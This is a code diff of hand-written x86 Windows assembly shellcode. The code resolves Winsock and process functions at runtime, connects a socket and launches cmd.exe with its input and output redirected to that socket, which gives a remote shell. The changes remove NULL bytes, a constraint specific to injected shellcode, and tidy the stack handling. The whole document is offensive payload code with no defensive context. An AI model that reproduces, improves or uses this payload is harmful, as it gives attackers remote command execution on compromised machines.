@@ -26,7 +26,8 @@ Assume Fs:Nothing
 	Mov [Ebp - 4AH], Eax			; This will store connect() base address
 	Mov [Ebp - 4EH], Eax			; This will store the address of CreateProcessA
 
-	Push 00007373H
+	Mov Ax, 7373H
+	Push Eax				; Avoid NULL bytes
 	Push 65726464H
 	Push 41636F72H
 	Push 50746547H
@@ -101,14 +102,12 @@ getFunctionAddress:
 	Xor Edx, Edx
 	Mov Edx, Eax
 	Mov [Ebp - 14H], Edx			; Saving base address of GetProcAddress
-	Push Ebx				; Kernel32 base address
-	Push Edx				; GetProcAddress
 	Push Ecx
 	Push 41797261H				; aryA
 	Push 7262694CH				; Libr
 	Push 64616F4CH				; Load
 	Push Esp
-	Push Ebx
+	Push Ebx				; Kernel32 base address
 	Call Edx				; Call GetProcAddress
 	Mov [Ebp - 18H], Eax			; Saving LoadLibraryA address
 
@@ -116,24 +115,18 @@ getFunctionAddress:
 	Add Esp, 0CH
 	Xor Ecx, Ecx
 	Mov Edx, [Ebp - 14H]
-	Push Ebx
-	Push Edx
-	Push Ecx
 	Push 656C646EH
 	Push 61486474H
 	Push 53746553H
 	Push Esp
 	Push Ebx
-	Call Edx
+	Call Edx				; Call GetProcAddress
 	Mov [Ebp - 3EH], Eax			; Saving SetStdHandle()
 
 	; Load CreateProcessA
 	Add Esp, 0CH
 	Xor Ecx, Ecx
 	Mov Edx, [Ebp - 14H]
-	Push Ebx
-	Push Edx
-	Push Ecx
 	Mov Cx, 4173H
 	Push Ecx
 	Push 7365636FH
@@ -148,8 +141,6 @@ getFunctionAddress:
 	Add Esp, 10H				; Clear CreateProcessA from the stack
 	Xor Ecx, Ecx
 	Mov Eax, [Ebp - 18H]			; Move LoadLibraryA address to eax
-	Push Eax				; LoadLibraryA
-	Push Ecx
 	Mov Cx, 6C6CH
 	Push Ecx
 	Push 642E7472H
@@ -162,9 +153,6 @@ getFunctionAddress:
 	Add Esp, 0CH				; Clear msvcrt.dll from the stack
 	Xor Ecx, Ecx
 	Mov Edx, [Ebp - 14H]
-	Push Eax				; Push msvcrt.dll base address
-	Push Edx
-	Push Ecx
 	Mov Cx, 6D65H				; em
 	Push Ecx
 	Push 74737973H				; syt
@@ -178,8 +166,6 @@ getFunctionAddress:
 	Mov Eax, [Ebp - 18H]
 	Add Esp, 8H				; Clear system from the stack
 	Xor Ecx, Ecx
-	Push Eax				; LoadLibraryA address
-	Push Ecx
 	Mov Cx, 6C6CH				; ll
 	Push Ecx
 	Push 642E3233H				; 32.d
@@ -200,7 +186,6 @@ getFunctionAddress:
 	Push Eax				; ws2_32.dll base address
 	Call Edx				; GetProcAddress
 	Mov [Ebp - 24H], Eax			; Saving WSAStartup address
-
 
 	; Get WSASocketA address
 	Add Esp, 0CH				; Clear WSAStartup from the stack
@@ -267,8 +252,7 @@ getFunctionAddress:
 	Call Edx				; GetProcAddress
 	Mov [Ebp - 4AH], Eax			; Saving connect() base address
 
-
-Bindshell:
+shell:
 	; System call: WSAStartup
 	Xor Edx, Edx
 	Xor Ecx, Ecx
@@ -313,13 +297,11 @@ Bindshell:
 	Push Ebx				; Arg 1(s): WSASocketA() Handler
 	Mov Eax, [Ebp - 4AH]			; connect()
 	Call Eax
-	Mov Esi, [Ebp - 4EH]			; Save CreateProcessA address in esi
-
 
 	; CreateProcessA
-	Push 61646D63H
-	Sub DWord Ptr [Esp + 3H], 61H
-	Mov Edx, Esp						; edx = pointer to "cmd"
+	Push 61646D63H						; "acmd"
+	Sub DWord Ptr [Esp + 3H], 61H				; Remove "a"
+	Mov Edx, Esp						; edx = pointer to "cmd" string
 
 	; STARTUPINFO struct
 	Push Ebx						; SetStdInput to WSASocketA() handler
@@ -327,12 +309,12 @@ Bindshell:
 	Push Ebx						; SetStdError to WSASocketA() handler
 	Xor Ebx, Ebx
 	Xor Ecx, Ecx
-	Add Cl, 12H
+	Add Cl, 12H						; ecx = 18
 
 zero_mem_struct:
-	Push Ebx
-	Loop zero_mem_struct
-	Mov Word Ptr [Esp + 3CH], 101H	; dwFlag (60 bytes from the top of the stack)
+	Push Ebx						; 0
+	Loop zero_mem_struct					; Throw 0x00000000 into the stack 18 times
+	Mov Word Ptr [Esp + 3CH], 101H				; dwFlag (60 bytes from the top of the stack)
 	Mov Byte Ptr [Esp + 10H], 44H
 	Lea Eax, [Esp + 10H]
 
@@ -343,12 +325,13 @@ zero_mem_struct:
 	Push Ebx
 	Push Ebx
 	Inc Ebx
-	Push Ebx						; bInheritAttributes = True
-	Dec Ebx
-	Push Ebx						; lpThreadAttributes
+	Push Ebx						; bInheritAttributes = 1 (True)
+	Dec Ebx					
+	Push Ebx						; lpThreadAttributes = 0 (False)
 	Push Ebx						; lpProcessAttributes
 	Push Edx						; Pointer to cmdline
 	Push Ebx						; lpApplicationName
-	Call Esi						; CreateProcessA
+	Mov Eax, [Ebp - 4EH]					; eax = CreateProcessA base address
+	Call Eax						; Call CreateProcessA
 
 End start
